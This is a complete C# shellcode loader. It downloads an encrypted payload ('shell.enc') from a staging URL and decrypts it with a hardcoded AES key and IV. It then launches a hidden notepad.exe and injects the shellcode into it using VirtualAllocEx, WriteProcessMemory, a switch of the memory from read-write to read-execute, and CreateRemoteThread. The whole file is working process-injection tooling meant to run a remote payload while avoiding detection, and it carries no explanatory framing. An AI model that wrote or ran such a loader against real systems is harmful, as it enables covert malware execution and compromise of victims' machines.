using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class Program
{
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct STARTUPINFO
    {
        uint cb;
        IntPtr lpReserved;
        IntPtr lpDesktop;
        IntPtr lpTitle;
        uint dwX;
        uint dwY;
        uint dwXSize;
        uint dwYSize;
        uint dwXCountChars;
        uint dwYCountChars;
        uint dwFillAttributes;
        uint dwFlags;
        ushort wShowWindow;
        ushort cbReserved;
        IntPtr lpReserved2;
        IntPtr hStdInput;
        IntPtr hStdOutput;
        IntPtr hStdErr;
    }

    public const uint PageReadWrite = 0x04;
    public const uint PageReadExecute = 0x20;

    public const uint DetachedProcess = 0x00000008;
    public const uint CreateNoWindow = 0x08000000;

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
    private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    static void Main()
    {
        string url = "http://127.0.0.1:8000/shell.enc"; // IMPORTANT: include port

        byte[] shellcode = new WebClient().DownloadData(url);

        Aes aes = Aes.Create();
        byte[] key = new byte[16] { 0x1e, 0x71, 0x5b, 0xdf, 0x7a, 0x5f, 0x02, 0x1b, 0x25, 0x1d, 0x5b, 0xa7, 0xe1, 0xd1, 0xca, 0x97 };
        byte[] iv = new byte[16] { 0xae, 0x5d, 0xc3, 0x13, 0x6f, 0xc3, 0xf5, 0x87, 0xda, 0xee, 0xc5, 0xca, 0x82, 0x3f, 0xd5, 0xe2 };
        ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
        byte[] buf;
        using (var msDecrypt = new System.IO.MemoryStream(shellcode))
        {
            using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
            {
                using (var msPlain = new System.IO.MemoryStream())
                {
                    csDecrypt.CopyTo(msPlain);
                    buf = msPlain.ToArray();
                }
            }
        }

        STARTUPINFO startInfo = new STARTUPINFO();
        PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
        uint flags = DetachedProcess | CreateNoWindow;
        CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, IntPtr.Zero, ref startInfo, out procInfo);
        IntPtr lpBaseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, PageReadWrite);
        IntPtr outSize;
        WriteProcessMemory(procInfo.hProcess, lpBaseAddress, buf, buf.Length, out outSize);
        uint lpflOldProtect;
        VirtualProtectEx(procInfo.hProcess, lpBaseAddress, (uint)buf.Length, PageReadExecute, out lpflOldProtect);
        IntPtr hThread = CreateRemoteThread(procInfo.hProcess, IntPtr.Zero, 0, lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);

    }
}
